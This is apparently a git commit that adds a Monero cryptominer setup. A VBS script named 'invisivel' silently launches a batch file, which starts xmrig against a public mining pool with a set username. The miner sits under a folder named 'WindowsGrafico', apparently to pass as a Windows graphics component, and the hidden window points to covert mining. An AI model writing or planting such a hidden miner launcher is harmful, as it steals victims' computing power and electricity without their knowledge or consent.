faa3914662ae37bce00ea3fcaf98fe400aa53337
maxconforto <71546501+maxconforto@users.noreply.github.com>
2020-09-19 23:41:22 +0900

    meu
    a deus

---
+++ WindowsGrafico/MONERO/xmrig/invisivel.vbs
@@ -0,0 +1,2 @@
+set objshell = wscript.createobject("wscript.shell")
+objshell.run("C:\STI\WindowsGrafico\MONERO\xmrig\start-cpu.bat"),0, true
---
+++ WindowsGrafico/MONERO/xmrig/start-cpu.bat
@@ -0,0 +1,2 @@
+xmrig.exe --randomx-mode=fast --coin monero #--opencl #--cuda #--no-cpu -t 3 -o asia.randomx-hub.miningpoolhub.com:20580 -u YW5vbnltb3Vz.bi -p x --donate-level 1
+pause
